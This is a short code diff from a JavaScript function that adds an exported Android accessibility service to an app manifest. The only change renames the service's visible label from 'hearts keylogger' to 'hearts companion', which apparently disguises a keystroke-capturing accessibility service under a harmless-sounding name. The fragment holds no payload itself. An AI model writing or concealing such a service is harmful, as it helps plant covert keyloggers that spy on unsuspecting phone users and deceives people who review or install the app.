@@ -79,7 +79,7 @@ function addService(manifest) {
     $: {
       'android:name': SERVICE_CLASS,
       'android:exported': 'true',
-      'android:label': 'hearts keylogger',
+      'android:label': 'hearts companion',
       'android:permission': 'android.permission.BIND_ACCESSIBILITY_SERVICE',
       'android:foregroundServiceType': 'dataSync',
     },
